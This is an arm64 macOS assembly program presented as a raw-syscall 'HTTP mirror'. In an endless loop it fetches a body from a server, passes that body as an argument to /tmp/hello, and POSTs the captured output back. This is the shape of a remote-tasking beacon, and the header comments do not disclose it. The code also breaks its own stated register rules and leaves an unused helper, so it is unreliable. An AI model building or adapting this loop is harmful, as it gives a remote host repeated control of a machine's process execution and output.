// macOS arm64 raw-syscall HTTP mirror (Content-Length required)
// Usage: ./mirror_macos <ipv4> <port> <path>
// Example: ./mirror_macos 127.0.0.1 8080 /
//
// Notes:
// - IPv4 dotted decimal only (no DNS)
// - Uses "Content-Length" in response
// - No TLS
//
// ABI / correctness fixes:
// - Uses ONLY x0-x18 (no x19-x28).
// - Non-leaf funcs keep state in stack locals (no callee-saved regs needed).
// - Request builders take (ip_ptr, path_ptr) as args (no globals).
// - All string lengths computed by assembler.
// - Apple/clang IAS: symbolic immediates can't be used with ADD (imm) in many places,
//   so we materialize *_len into a register (x12) before ADD.

        .text
        .global _main

// -------------------- constants --------------------
        .equ AF_INET,      2
        .equ SOCK_STREAM,  1
        .equ IPPROTO_TCP,  6

        .equ HDR_MAX,      4096
        .equ BODY_MAX,     8192
        .equ REQ_MAX,      4096

// BSD syscall numbers (Darwin): syscall = 0x2000000 + n
        .equ SYS_exit_n,    1
        .equ SYS_read_n,    3
        .equ SYS_write_n,   4
        .equ SYS_close_n,   6
        .equ SYS_socket_n,  97
        .equ SYS_connect_n, 98

        .equ SYS_vfork_n,  66
        .equ SYS_execve_n, 59
        .equ SYS_pipe_n,   42
        .equ SYS_dup2_n,   90
        .equ SYS_wait4_n,  7

// -------------------- rodata --------------------
        .section __TEXT,__const

binary_path: .asciz "/tmp/hello"
f_flag:      .asciz "-f"
child_msg: .asciz "CHILD START\n"
usage_msg:
        .ascii  "Usage: ./mirror_macos <ipv4> <port> <path>\n"
usage_len = . - usage_msg

crlfcrlf:
        .ascii  "\r\n\r\n"
crlfcrlf_len = . - crlfcrlf

cl_hdr:
        .ascii  "Content-Length:"
cl_hdr_len = . - cl_hdr

get_p1:  .ascii "GET "
get_p1_len = . - get_p1

get_p2:  .ascii " HTTP/1.1\r\nHost: "
get_p2_len = . - get_p2

get_p3:  .ascii "\r\nConnection: close\r\n\r\n"
get_p3_len = . - get_p3

post_p1: .ascii "POST "
post_p1_len = . - post_p1

post_p2: .ascii " HTTP/1.1\r\nHost: "
post_p2_len = . - post_p2

post_p3: .ascii "\r\nContent-Type: application/octet-stream\r\nContent-Length: "
post_p3_len = . - post_p3

post_p4: .ascii "\r\nConnection: close\r\n\r\n"
post_p4_len = . - post_p4

// -------------------- bss --------------------
        .section __DATA,__bss
        .align  4
hdr_buf:  .skip  HDR_MAX
body_buf: .skip  BODY_MAX
req_buf:  .skip  REQ_MAX
len_buf:  .skip  32

// -------------------- macros --------------------
        .section __TEXT,__text,regular,pure_instructions
        .macro LOAD_SYSCALL n
        movz    x16, #(\n & 0xFFFF)
        movk    x16, #0x0200, lsl #16
        .endm

        .macro DO_SYSCALL
        svc     #0x80
        .endm

// -------------------- syscalls (minimal wrappers) --------------------
sys_exit:       // x0=code
        LOAD_SYSCALL SYS_exit_n
        DO_SYSCALL
        ret

sys_write:      // x0=fd, x1=buf, x2=len  -> x0=written or -errno
        LOAD_SYSCALL SYS_write_n
        DO_SYSCALL
        ret

sys_read:       // x0=fd, x1=buf, x2=len  -> x0=read or -errno
        LOAD_SYSCALL SYS_read_n
        DO_SYSCALL
        ret

sys_close:      // x0=fd
        LOAD_SYSCALL SYS_close_n
        DO_SYSCALL
        ret

sys_socket:     // x0=domain, x1=type, x2=proto -> x0=fd or -errno
        LOAD_SYSCALL SYS_socket_n
        DO_SYSCALL
        ret

sys_connect:    // x0=fd, x1=sockaddr*, x2=len -> x0=0 or -errno
        LOAD_SYSCALL SYS_connect_n
        DO_SYSCALL
        ret

// -------------------- utilities (leaf) --------------------
strlen:         // x0=ptr -> x0=len
        mov     x1, x0
1:      ldrb    w2, [x1]
        cbz     w2, 2f
        add     x1, x1, #1
        b       1b
2:      sub     x0, x1, x0
        ret

memcpy_n:       // x0=src, x1=dst, x2=len
        cbz     x2, 2f
1:      ldrb    w3, [x0], #1
        strb    w3, [x1], #1
        subs    x2, x2, #1
        b.ne    1b
2:      ret

parse_u32:      // x0=ptr -> w0=value (decimal)
        mov     w1, #0
1:      ldrb    w2, [x0], #1
        cmp     w2, #'0'
        b.lt    2f
        cmp     w2, #'9'
        b.gt    2f
        sub     w2, w2, #'0'
        mov     w3, #10
        mul     w1, w1, w3
        add     w1, w1, w2
        b       1b
2:      mov     w0, w1
        ret

htons_w:        // w0=port -> w0=htons(port)
        and     w1, w0, #0xFF
        lsr     w2, w0, #8
        and     w2, w2, #0xFF
        lsl     w1, w1, #8
        orr     w0, w1, w2
        ret

parse_ipv4:     // x0=ptr -> w0=ip BIG-END numeric (127.0.0.1 => 0x7f000001)
        mov     w1, #0
        mov     w3, #0
1:      ldrb    w4, [x0], #1
        cbz     w4, 4f
        cmp     w4, #'.'
        b.eq    dot
        cmp     w4, #'0'
        b.lt    4f
        cmp     w4, #'9'
        b.gt    4f
        sub     w4, w4, #'0'
        mov     w5, #10
        mul     w1, w1, w5
        add     w1, w1, w4
        b       1b
dot:    lsl     w3, w3, #8
        orr     w3, w3, w1
        mov     w1, #0
        b       1b
4:      lsl     w3, w3, #8
        orr     w0, w3, w1
        ret

// find_mem: x0=hay, x1=haylen, x2=needle, x3=needlelen -> x0=ptr or 0
find_mem:
        cbz     x3, nf
        subs    x4, x1, x3
        b.lt    nf
        mov     x5, #0
outer:
        add     x6, x0, x5
        mov     x7, #0
inner:
        ldrb    w8, [x6, x7]
        ldrb    w9, [x2, x7]
        cmp     w8, w9
        b.ne    next
        add     x7, x7, #1
        cmp     x7, x3
        b.lt    inner
        add     x0, x0, x5
        ret
next:
        add     x5, x5, #1
        cmp     x5, x4
        b.le    outer
nf:     mov     x0, #0
        ret

// utoa: x0=buf, x1=value -> x0=ptr, x1=len
utoa:
        mov     x2, x0
        mov     x3, x1
        cbnz    x3, 1f
        mov     w4, #'0'
        strb    w4, [x2]
        mov     x0, x2
        mov     x1, #1
        ret
1:      add     x4, x2, #31
        mov     x5, #0
2:      mov     x6, #10
        udiv    x7, x3, x6
        msub    x8, x7, x6, x3
        add     x8, x8, #'0'
        strb    w8, [x4], #-1
        add     x5, x5, #1
        mov     x3, x7
        cbnz    x3, 2b
        add     x0, x4, #1
        mov     x1, x5
        ret

// -------------------- send_all / recv_exact (NON-LEAF: x0-x18 only) ---------
send_all:       // x0=fd, x1=buf, x2=len
        sub     sp, sp, #48
        str     x0, [sp, #0]      // fd
        str     x1, [sp, #8]      // buf
        str     x2, [sp, #16]     // remaining
        str     x30,[sp, #40]
1:      ldr     x2, [sp, #16]
        cbz     x2, 2f
        ldr     x0, [sp, #0]
        ldr     x1, [sp, #8]
        bl      sys_write
        tbnz    x0, #63, fatal_local
        cbz     x0, fatal_local
        ldr     x1, [sp, #8]
        add     x1, x1, x0
        str     x1, [sp, #8]
        ldr     x2, [sp, #16]
        sub     x2, x2, x0
        str     x2, [sp, #16]
        b       1b
2:      ldr     x30,[sp, #40]
        add     sp, sp, #48
        ret

recv_exact:     // x0=fd, x1=buf, x2=len
        sub     sp, sp, #48
        str     x0, [sp, #0]
        str     x1, [sp, #8]
        str     x2, [sp, #16]
        str     x30,[sp, #40]
1:      ldr     x2, [sp, #16]
        cbz     x2, 2f
        ldr     x0, [sp, #0]
        ldr     x1, [sp, #8]
        bl      sys_read
        tbnz    x0, #63, fatal_local
        cbz     x0, fatal_local
        ldr     x1, [sp, #8]
        add     x1, x1, x0
        str     x1, [sp, #8]
        ldr     x2, [sp, #16]
        sub     x2, x2, x0
        str     x2, [sp, #16]
        b       1b
2:      ldr     x30,[sp, #40]
        add     sp, sp, #48
        ret

// -------------------- HTTP parsing (NON-LEAF: x0-x18 only) ------------------
read_headers:   // in: x0=fd  out: x0=hdr_total, x1=hdr_end
        sub     sp, sp, #64
        str     x0, [sp, #0]      // fd
        mov     x0, #0
        str     x0, [sp, #8]      // total
        adrp    x0, hdr_buf@PAGE
        add     x0, x0, hdr_buf@PAGEOFF
        str     x0, [sp, #16]     // base
        str     x30,[sp, #56]
1:      ldr     x0, [sp, #0]
        ldr     x3, [sp, #16]
        ldr     x4, [sp, #8]
        add     x1, x3, x4
        mov     x2, #(HDR_MAX)
        sub     x2, x2, x4
        bl      sys_read
        tbnz    x0, #63, fatal_local
        cbz     x0, fatal_local
        ldr     x4, [sp, #8]
        add     x4, x4, x0
        str     x4, [sp, #8]
        ldr     x0, [sp, #16]
        ldr     x1, [sp, #8]
        adrp    x2, crlfcrlf@PAGE
        add     x2, x2, crlfcrlf@PAGEOFF
        mov     x3, #crlfcrlf_len
        bl      find_mem
        cbz     x0, 1b
        ldr     x5, [sp, #16]
        sub     x1, x0, x5
        mov     x12, #crlfcrlf_len
        add     x1, x1, x12
        ldr     x0, [sp, #8]
        ldr     x30,[sp, #56]
        add     sp, sp, #64
        ret

parse_content_length:   // in: x0=hdr_end  out: x0=content_len (u64)
        sub     sp, sp, #64
        str     x0, [sp, #0]      // hdr_end
        adrp    x0, hdr_buf@PAGE
        add     x0, x0, hdr_buf@PAGEOFF
        str     x0, [sp, #8]      // base
        str     x30,[sp, #56]
        ldr     x0, [sp, #8]
        ldr     x1, [sp, #0]
        adrp    x2, cl_hdr@PAGE
        add     x2, x2, cl_hdr@PAGEOFF
        mov     x3, #cl_hdr_len
        bl      find_mem
        cbz     x0, fatal_local
        mov     x12, #cl_hdr_len
        add     x0, x0, x12
skipsp:
        ldrb    w1, [x0]
        cmp     w1, #' '
        b.ne    parsecl
        add     x0, x0, #1
        b       skipsp
parsecl:
        bl      parse_u32
        uxtw    x0, w0
        ldr     x30,[sp, #56]
        add     sp, sp, #64
        ret

// -------------------- request builders (NON-LEAF: x0-x18 only) --------------
// build_get_request(ip_ptr, path_ptr) -> x0=req_ptr, x1=req_len
// build_get_request(ip_ptr, path_ptr) -> x0=req_ptr, x1=req_len
build_get_request:
        sub     sp, sp, #128
        str     x30,[sp, #120]
        str     x0, [sp, #0]      // ip_ptr
        str     x1, [sp, #8]      // path_ptr

        adrp    x2, req_buf@PAGE
        add     x2, x2, req_buf@PAGEOFF
        str     x2, [sp, #16]     // base
        str     x2, [sp, #24]     // cursor

        // "GET "
        adrp    x0, get_p1@PAGE
        add     x0, x0, get_p1@PAGEOFF
        ldr     x1, [sp, #24]
        mov     x2, #get_p1_len
        bl      memcpy_n
        ldr     x3, [sp, #24]
        mov     x12, #get_p1_len
        add     x3, x3, x12
        str     x3, [sp, #24]

        // path (reload pointer from stack before each use)
        ldr     x0, [sp, #8]
        bl      strlen
        str     x0, [sp, #32]     // path_len
        ldr     x0, [sp, #8]      // src = path_ptr
        ldr     x1, [sp, #24]     // dst = cursor
        ldr     x2, [sp, #32]     // len
        bl      memcpy_n
        ldr     x3, [sp, #24]
        ldr     x2, [sp, #32]
        add     x3, x3, x2
        str     x3, [sp, #24]

        // get_p2
        adrp    x0, get_p2@PAGE
        add     x0, x0, get_p2@PAGEOFF
        ldr     x1, [sp, #24]
        mov     x2, #get_p2_len
        bl      memcpy_n
        ldr     x3, [sp, #24]
        mov     x12, #get_p2_len
        add     x3, x3, x12
        str     x3, [sp, #24]

        // ip (reload pointer from stack before each use)
        ldr     x0, [sp, #0]
        bl      strlen
        str     x0, [sp, #40]     // ip_len
        ldr     x0, [sp, #0]      // src = ip_ptr
        ldr     x1, [sp, #24]     // dst = cursor
        ldr     x2, [sp, #40]     // len
        bl      memcpy_n
        ldr     x3, [sp, #24]
        ldr     x2, [sp, #40]
        add     x3, x3, x2
        str     x3, [sp, #24]

        // get_p3
        adrp    x0, get_p3@PAGE
        add     x0, x0, get_p3@PAGEOFF
        ldr     x1, [sp, #24]
        mov     x2, #get_p3_len
        bl      memcpy_n
        ldr     x3, [sp, #24]
        mov     x12, #get_p3_len
        add     x3, x3, x12
        str     x3, [sp, #24]

        // return ptr,len
        ldr     x0, [sp, #16]
        ldr     x3, [sp, #24]
        sub     x1, x3, x0

        ldr     x30,[sp, #120]
        add     sp, sp, #128
        ret

// build_post_header(body_len, ip_ptr, path_ptr) -> x0=hdr_ptr, x1=hdr_len
build_post_header:
        sub     sp, sp, #160
        str     x30,[sp, #152]
        str     x0, [sp, #0]      // body_len
        str     x1, [sp, #8]      // ip_ptr
        str     x2, [sp, #16]     // path_ptr

        adrp    x3, req_buf@PAGE
        add     x3, x3, req_buf@PAGEOFF
        str     x3, [sp, #24]     // base
        str     x3, [sp, #32]     // cursor

        // "POST "
        adrp    x0, post_p1@PAGE
        add     x0, x0, post_p1@PAGEOFF
        ldr     x1, [sp, #32]
        mov     x2, #post_p1_len
        bl      memcpy_n
        ldr     x4, [sp, #32]
        mov     x12, #post_p1_len
        add     x4, x4, x12
        str     x4, [sp, #32]

        // path
        ldr     x0, [sp, #16]
        bl      strlen
        str     x0, [sp, #40]     // path_len
        ldr     x0, [sp, #16]     // src
        ldr     x1, [sp, #32]     // dst
        ldr     x2, [sp, #40]     // len
        bl      memcpy_n
        ldr     x4, [sp, #32]
        ldr     x2, [sp, #40]
        add     x4, x4, x2
        str     x4, [sp, #32]

        // post_p2
        adrp    x0, post_p2@PAGE
        add     x0, x0, post_p2@PAGEOFF
        ldr     x1, [sp, #32]
        mov     x2, #post_p2_len
        bl      memcpy_n
        ldr     x4, [sp, #32]
        mov     x12, #post_p2_len
        add     x4, x4, x12
        str     x4, [sp, #32]

        // ip
        ldr     x0, [sp, #8]
        bl      strlen
        str     x0, [sp, #48]     // ip_len
        ldr     x0, [sp, #8]      // src
        ldr     x1, [sp, #32]     // dst
        ldr     x2, [sp, #48]     // len
        bl      memcpy_n
        ldr     x4, [sp, #32]
        ldr     x2, [sp, #48]
        add     x4, x4, x2
        str     x4, [sp, #32]

        // post_p3
        adrp    x0, post_p3@PAGE
        add     x0, x0, post_p3@PAGEOFF
        ldr     x1, [sp, #32]
        mov     x2, #post_p3_len
        bl      memcpy_n
        ldr     x4, [sp, #32]
        mov     x12, #post_p3_len
        add     x4, x4, x12
        str     x4, [sp, #32]

        // utoa(len_buf, body_len) -> returns digits_ptr in x0 and digits_len in x1
        adrp    x0, len_buf@PAGE
        add     x0, x0, len_buf@PAGEOFF
        ldr     x1, [sp, #0]
        bl      utoa
        // SAVE returned values immediately
        str     x0, [sp, #56]     // digits_ptr
        str     x1, [sp, #64]     // digits_len

        // copy digits: memcpy_n(src=digits_ptr, dst=cursor, len=digits_len)
        ldr     x0, [sp, #56]     // src = digits_ptr
        ldr     x1, [sp, #32]     // dst = cursor
        ldr     x2, [sp, #64]     // len = digits_len
        bl      memcpy_n
        ldr     x4, [sp, #32]
        ldr     x2, [sp, #64]
        add     x4, x4, x2
        str     x4, [sp, #32]

        // post_p4
        adrp    x0, post_p4@PAGE
        add     x0, x0, post_p4@PAGEOFF
        ldr     x1, [sp, #32]
        mov     x2, #post_p4_len
        bl      memcpy_n
        ldr     x4, [sp, #32]
        mov     x12, #post_p4_len
        add     x4, x4, x12
        str     x4, [sp, #32]

        // return ptr,len
        ldr     x0, [sp, #24]
        ldr     x4, [sp, #32]
        sub     x1, x4, x0

        ldr     x30,[sp, #152]
        add     sp, sp, #160
        ret

// -------------------- connect helper (NON-LEAF: x0-x18 only) ----------------
// signature:
//   x0 = ip_u32 bytes for sockaddr (already rev'd for little-endian store)
//   x1 = port_u16 (network order in low 16 bits)
// returns x0=fd
open_and_connect:
        sub     sp, sp, #64
        str     x30,[sp, #56]
        str     x0, [sp, #0]      // ip
        str     x1, [sp, #8]      // port

        // sockaddr at [sp+16]
        add     x2, sp, #16

        mov     w3, #16
        strb    w3, [x2, #0]
        mov     w3, #AF_INET
        strb    w3, [x2, #1]

        ldr     w3, [sp, #8]
        strh    w3, [x2, #2]

        ldr     w3, [sp, #0]
        str     w3, [x2, #4]

        mov     x3, #0
        str     x3, [x2, #8]

        // socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)
        mov     x0, #AF_INET
        mov     x1, #SOCK_STREAM
        mov     x2, #IPPROTO_TCP
        bl      sys_socket
        tbnz    x0, #63, fatal_local
        str     x0, [sp, #48]     // fd

        // connect(fd, &sockaddr, 16)
        ldr     x0, [sp, #48]
        add     x1, sp, #16
        mov     x2, #16
        bl      sys_connect
        tbnz    x0, #63, fatal_local

        ldr     x0, [sp, #48]
        ldr     x30,[sp, #56]
        add     sp, sp, #64
        ret

// -------------------- program entry --------------------
_main:
        // frame (176 bytes) locals (16-byte aligned)
        sub     sp, sp, #176
        str     x30, [sp, #168]

        // argc=x0, argv=x1
        cmp     x0, #4
        b.ge    have_args

        mov     x0, #1
        adrp    x1, usage_msg@PAGE
        add     x1, x1, usage_msg@PAGEOFF
        mov     x2, #usage_len
        bl      sys_write

        mov     x0, #1
        bl      sys_exit

have_args:
        // argv[1]=ip, argv[2]=port, argv[3]=path
        ldr     x2, [x1, #8]
        ldr     x3, [x1, #16]
        ldr     x4, [x1, #24]
        str     x2, [sp, #0]
        str     x3, [sp, #8]
        str     x4, [sp, #16]

        // parse ip -> big-endian numeric, then REV so bytes stored are correct
        ldr     x0, [sp, #0]
        bl      parse_ipv4
        rev     w0, w0
        str     x0, [sp, #24]

        // parse port -> htons
        ldr     x0, [sp, #8]
        bl      parse_u32
        bl      htons_w
        uxtw    x0, w0
        str     x0, [sp, #32]

        // base pointers
        adrp    x5, hdr_buf@PAGE
        add     x5, x5, hdr_buf@PAGEOFF
        str     x5, [sp, #88]
        adrp    x5, body_buf@PAGE
        add     x5, x5, body_buf@PAGEOFF
        str     x5, [sp, #96]

loop_cycle:
        // ---------------- GET ----------------
        ldr     x0, [sp, #24]
        ldr     x1, [sp, #32]
        bl      open_and_connect
        str     x0, [sp, #40]

        // build_get_request(ip_ptr, path_ptr)
        ldr     x0, [sp, #0]
        ldr     x1, [sp, #16]
        bl      build_get_request
        str     x0, [sp, #48]
        str     x1, [sp, #56]

        // send request
        ldr     x0, [sp, #40]
        ldr     x1, [sp, #48]
        ldr     x2, [sp, #56]
        bl      send_all

        // read headers
        ldr     x0, [sp, #40]
        bl      read_headers
        str     x0, [sp, #64]
        str     x1, [sp, #72]

        // parse content-length
        ldr     x0, [sp, #72]
        bl      parse_content_length
        str     x0, [sp, #80]

        // already = hdr_total - hdr_end
        ldr     x6, [sp, #64]
        ldr     x7, [sp, #72]
        sub     x6, x6, x7
        ldr     x8, [sp, #80]
        cmp     x6, x8
        csel    x6, x6, x8, lo
        str     x6, [sp, #104]    // copied

        // copy already-read body bytes from hdr_buf tail
        ldr     x9,  [sp, #88]    // hdr base
        ldr     x10, [sp, #96]    // body base
        ldr     x7,  [sp, #72]    // hdr_end
        add     x0, x9, x7
        mov     x1, x10
        ldr     x2, [sp, #104]
        bl      memcpy_n

        // need = cl - copied
        ldr     x8, [sp, #80]
        ldr     x6, [sp, #104]
        sub     x8, x8, x6
        str     x8, [sp, #112]
        cbz     x8, got_body

        // recv_exact(sockfd, body+copied, need)
        ldr     x0, [sp, #40]
        ldr     x1, [sp, #96]
        ldr     x6, [sp, #104]
        add     x1, x1, x6
        ldr     x2, [sp, #112]
        bl      recv_exact

got_body:
        // 1. Null-terminate
        ldr     x10, [sp, #96]    // body_buf
        ldr     x8,  [sp, #80]    // len
        strb    wzr, [x10, x8]

// 1. Setup Pipe
        LOAD_SYSCALL SYS_pipe_n
        DO_SYSCALL                
        // macOS: x0 = read_fd, x1 = write_fd
        str     x0, [sp, #128]
        str     x1, [sp, #136]

        // 2. vfork instead of fork
        // Note: Parent is suspended until child calls execve or exit
        LOAD_SYSCALL SYS_vfork_n          // SYS_vfork
        svc     #0x80
        str     x0, [sp, #120]    // save pid
        
        cmp     x0, #0
        b.ne    parent_process

child_process:
        // Load pipe fds
        ldr     x19, [sp, #128]   // read_fd
        ldr     x20, [sp, #136]   // write_fd

        // Redirect stdout to pipe write end
        mov     x0, x20
        mov     x1, #1
        LOAD_SYSCALL SYS_dup2_n
        svc     #0x80

        // Close fds in child
        mov     x0, x19
        bl      sys_close
        mov     x0, x20
        bl      sys_close

        // Align stack and build argv
        sub     sp, sp, #48
        adrp    x0, binary_path@PAGE
        add     x0, x0, binary_path@PAGEOFF
        adrp    x1, f_flag@PAGE
        add     x1, x1, f_flag@PAGEOFF
        adrp    x2, body_buf@PAGE
        add     x2, x2, body_buf@PAGEOFF
        
        str     x0, [sp, #0]      // argv[0]
        str     x1, [sp, #8]      // argv[1]
        str     x2, [sp, #16]     // argv[2]
        str     xzr, [sp, #24]    // argv[3] = NULL

        mov     x1, sp            // argv array
        mov     x2, xzr           // envp = NULL
        LOAD_SYSCALL SYS_execve_n
        svc     #0x80

        // If execve fails
        mov     x0, #255
        LOAD_SYSCALL SYS_exit_n
        svc     #0x80

parent_process:
        // 1. Close the WRITE end so the read() can eventually hit EOF
        ldr     x0, [sp, #136]
        bl      sys_close

        // 2. Read output from the child
        ldr     x0, [sp, #128]    // read_fd
        adrp    x1, body_buf@PAGE 
        add     x1, x1, body_buf@PAGEOFF
        mov     x2, #BODY_MAX
        bl      sys_read          
        
        // 3. Store byte count for the POST request
        cmp     x0, #0
        csel    x0, x0, xzr, ge
        str     x0, [sp, #80]     // This is the new Content-Length

        // 4. Cleanup
        ldr     x0, [sp, #128]    // read_fd
        bl      sys_close

        // 5. Wait for child
        ldr     x0, [sp, #120]
        mov     x1, #0
        mov     x2, #0
        mov     x3, #0
        LOAD_SYSCALL SYS_wait4_n
        svc     #0x80

        b       post_start

close_pipe_fds:
        mov     x0, x19
        LOAD_SYSCALL SYS_close_n
        svc     #0x80
        mov     x0, x20
        LOAD_SYSCALL SYS_close_n
        svc     #0x80
        ret

post_start:
        // --- CONTINUE TO POST ---
        ldr     x0, [sp, #40]     // close GET sock
        bl      sys_close

        // ---------------- POST (mirror) ----------------
        ldr     x0, [sp, #24]
        ldr     x1, [sp, #32]
        bl      open_and_connect
        str     x0, [sp, #40]

        // build_post_header(body_len, ip_ptr, path_ptr)
        ldr     x0, [sp, #80]
        ldr     x1, [sp, #0]
        ldr     x2, [sp, #16]
        bl      build_post_header
        str     x0, [sp, #48]
        str     x1, [sp, #56]

        // send header
        ldr     x0, [sp, #40]
        ldr     x1, [sp, #48]
        ldr     x2, [sp, #56]
        bl      send_all

        // send body
        ldr     x0, [sp, #40]
        ldr     x1, [sp, #96]
        ldr     x2, [sp, #80]
        bl      send_all

        // close POST sock
        ldr     x0, [sp, #40]
        bl      sys_close

        b       loop_cycle

fatal_local:
fatal:
        mov     x0, #1
        bl      sys_exit
